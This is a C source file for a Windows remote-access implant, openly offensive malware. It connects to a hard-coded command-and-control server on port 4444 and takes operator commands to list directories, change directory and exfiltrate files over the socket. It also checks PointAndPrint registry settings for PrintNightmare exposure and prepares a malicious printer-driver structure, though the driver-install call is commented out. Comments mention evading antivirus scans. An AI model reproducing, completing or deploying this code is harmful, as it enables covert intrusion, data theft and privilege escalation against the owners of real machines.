#include "c2_net.h"
#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <shlwapi.h>
#include <winspool.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Winspool.lib")

// Configurations
#define SLEEP 1
#define SERVER_IP "192.168.187.13"
#define SERVER_PORT 4444

SOCKET c2_sock;
HANDLE heap;

// Present working directory, globally accessible
char pwd[MAX_PATH + 1] = {0};
 

// Attempt to change the pwd to the given path. Returns FALSE if path does not exist.
BOOL change_dir(char *path, int len) {

    // Absolute path
    if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
        memset(pwd, 0, _MAX_PATH + 1);
        strncpy(pwd, path, len);
        PathAddBackslashA(pwd); // Append trailing \ to path if needed
        return TRUE;
    }
    // No support for relative paths
    return FALSE;
}


// Write file + directory listing to out
DWORD ls(char *path, char* out) {
    char preparedPath[MAX_PATH];
    LARGE_INTEGER file_size;
    WIN32_FIND_DATA data;
    BOOL status = 0;
    int len = 0;
    
    // Copy the string to a buffer+ append '\*' to the directory name
    sprintf(preparedPath, "%s\\*", path);
    
    // Find first file
    HANDLE h = FindFirstFileA(preparedPath, &data);
    if (h == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Loop through rest of files
    do {
        char* name = data.cFileName;        
        
        // Directory
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            len += sprintf((char*) out + len, "DIR     %s\n", name);
        }
        // File
        else {
            file_size.LowPart = data.nFileSizeLow;
            file_size.HighPart = data.nFileSizeHigh;
            len += sprintf((char*) out + len, "FILE    %s \t %lld\n", name, file_size.QuadPart);
        }

        status = FindNextFileA(h, &data);
    } while (status != 0);
    
    FindClose(h);
    if (status == 0 || status == ERROR_NO_MORE_FILES)
        return 0;
    return -1;
}


// Reads data from file given by path and sends it back to C2 server
DWORD exfil(char* path) {
    char abs_path[MAX_PATH] = {0};
    DWORD numBytesRead = 0;
    LARGE_INTEGER fileSize;
    int status = 0;

    // Convert relative path to absolute path
    if (path[0] != 'C' || path[1] != ':') {
        sprintf(abs_path, "%s\\%s", pwd, path);
    }
    // Otherwise just use path as-is
    else {
        strcpy(abs_path, path);
    }

    // Open file
    HANDLE hFile = CreateFile(abs_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        c2_send(c2_sock, "ERROR opening file", 18);
        status = -1;
        goto end;
    }

    // Get file size
    int low = 0;
    low = GetFileSize(hFile, &fileSize.HighPart);
    fileSize.LowPart = low;

    // Allocate buffer on heap for the data
    char* out = (char*) HeapAlloc(heap, HEAP_ZERO_MEMORY, fileSize.QuadPart);
    if (out == NULL) {
        c2_send(c2_sock, "ERROR Not enough memory", 23);
        status = -1;
        goto end;
    }

    // Read data
    BOOL res = ReadFile(hFile, out, fileSize.QuadPart, &numBytesRead, NULL);
    if (!res) {
        c2_send(c2_sock, "ERROR reading file", 18);
        status = -1;
        goto end;
    }
    c2_send(c2_sock, out, numBytesRead);

end:
    HeapFree(heap, 0, out);
    CloseHandle(hFile);
    return status;
}



// Returns list of driver structures
// print: Whether to print all drivers or not
DRIVER_INFO_2* getDrivers(BOOL print) {
	DWORD numBytes;
	DWORD numDrivers;
	PBYTE drivers = NULL;

	// Initial call will fail but fill in numBytes so we know how much memory to allocate
	BOOL res = EnumPrinterDrivers(NULL, "Windows x64", 2, drivers, 0, &numBytes, &numDrivers);

	// Allocate memory and make the actual call now
	drivers = (PBYTE) LocalAlloc(0, numBytes);
	res = EnumPrinterDrivers(NULL, "Windows x64", 2, drivers, numBytes, &numBytes, &numDrivers);
	if (!res) {
		printf("[!] Driver enumeration failed\n");
		exit(1); // TODO handle better
	}

	if (print) {
		for (int i = 0; i < numDrivers; i++) {
			DRIVER_INFO_2 drv = *(DRIVER_INFO_2*)(drivers + i * sizeof(DRIVER_INFO_2));
			printf("Name   : %s\n", drv.pName);
			printf("Config : %s\n", drv.pConfigFile);
			printf("Data   : %s\n", drv.pDataFile);
			printf("Driver : %s\n", drv.pDriverPath);
			printf("Version: %u\n", drv.cVersion);
			printf("\n");
		}
	}
	
	return (DRIVER_INFO_2*) drivers;
}

// Checks the registry to see if host is vulnerable to printer nightmare.
// Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
DWORD check_registry_for_privesc() {
    DWORD status;
    HKEY hKey;
    DWORD val;
    int size = 4; // size of DWORD

    // Open handle
    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
    if (status == ERROR_FILE_NOT_FOUND) {
        return 0;
    }
    if (status != ERROR_SUCCESS) {
        return -1;
    }

    // Read first value
    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 0)) {
        RegCloseKey(hKey);
        return 0;
    }
    if (status != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return -1;
    }

    // Need to check both registry values
    status = RegGetValue(hKey, NULL, "NoWarningNoElevationOnInstall", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 1)) {
        RegCloseKey(hKey);
        return 0;
    }
    if (status != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return -1;
    }

    RegCloseKey(hKey);
    return 1;
}


// Attempts to gain administrator privileges via the Printer Nightmare CVE
DWORD escalate() {
    DWORD FLAGS = APD_COPY_ALL_FILES | 0x10 | 0x8000;
	CHAR dll_path[MAX_PATH];
	CHAR driver_path[MAX_PATH];

    // Check registry first
    int vulnerable  = check_registry_for_privesc();
    if (vulnerable == 0) {
        c2_send(c2_sock, "Target not vulnerable", 21);
        return -1;
    }
    if (vulnerable == -1) {
        c2_send(c2_sock, "ERROR: Could not check registry", 31);
        // TODO: If there was an error what do we do?
    }

	// Get path to a driver
	printf("[*] Enumerating drivers...\n");
	DRIVER_INFO_2* drivers = getDrivers(FALSE);
	strncpy(driver_path, drivers[0].pDriverPath, MAX_PATH);
	LocalFree(drivers);
	printf("[+] Path to driver: %s\n", driver_path);

	// Create driver object
	DRIVER_INFO_2 payload = {
		.cVersion = 3,
		.pDriverPath = driver_path,
		.pConfigFile = dll_path,
		.pDataFile = dll_path,
		.pEnvironment = "Windows x64",
		.pName = "EvilDriver"
	};

	// printf("[*] Attempting to add new driver...\n");
	// DWORD res = AddPrinterDriverEx(NULL, 2, (PBYTE) &payload, FLAGS);
	// if (!res) {
	// 	printf("[!] Adding printer driver failed\n");
	// 	exit(1);
	// }
	// printf("[*] Driver added successfully\n");


    return 0;
}


// cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
// cl implant.c c2_net.c /Fe:implant.exe
int main() {
    int status = 0;
    int len = 0;
    char buffer[512];


    // Sleep on start to avoid AV scans
    // Sleep(SLEEP * 1000);

    // Basic setup
    if (!setup_comms()) {
        return 1;
    }
    heap = GetProcessHeap();

    // Connect to C2 server (TODO: what to do if can't connect?)
    c2_sock = c2_connect(SERVER_IP, SERVER_PORT);
    if (c2_sock == INVALID_SOCKET) {
        closesocket(c2_sock);
        WSACleanup();
        return 1;
    }

    // Get present directory
    GetCurrentDirectory(_MAX_PATH, pwd);
    c2_send(c2_sock, pwd, strlen(pwd));

    
    while (TRUE) {
        // Read data from network buffer
        len = c2_recv(c2_sock, buffer, 511);
        if (len == SOCKET_ERROR)
            continue;
        c2_log("%s\n", buffer);



        // Main logic of implant functionality
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        else if(strncmp(buffer, "cd ", 3) == 0 && len >= 4) {
            if (! change_dir(buffer + 3, len - 3)) // buffer + 3 is start of arg passed to cd
                c2_send(c2_sock, "Invalid dir", 11);
        }

        else if(strncmp(buffer, "ls", 2) == 0) {
            char listing[4096] = {0};
            if (len == 2)
                status = ls(pwd, listing);
            else if (len >= 4)
                status = ls(buffer + 3, listing); // arg passed to ls

            // Check result
            if (status == 0) {
                c2_send(c2_sock, listing, strlen(listing));
            }
            else {
                c2_send(c2_sock, "ERROR", 5);
            }
        }

        else if(strncmp(buffer, "pwd", 2) == 0) {
            c2_send(c2_sock, pwd, strlen(pwd));
        }

        else if(strncmp(buffer, "exfil ", 5) == 0) {
            if (len >= 7) {
                exfil(buffer + 6);
            }   
        }

        else if(strncmp(buffer, "upload ", 6) == 0) {
            // falls more on the c2 server
        }

        else if(strncmp(buffer, "drivers", 7) == 0) {
            getDrivers(TRUE);
        }

        else if(strncmp(buffer, "escalate", 8) == 0) {
            escalate();
        }
        // TODO: what else?

        

    }

    // Close the socket
    closesocket(c2_sock);
    WSACleanup();
    return 0;
    // TODO: delete binary?
}
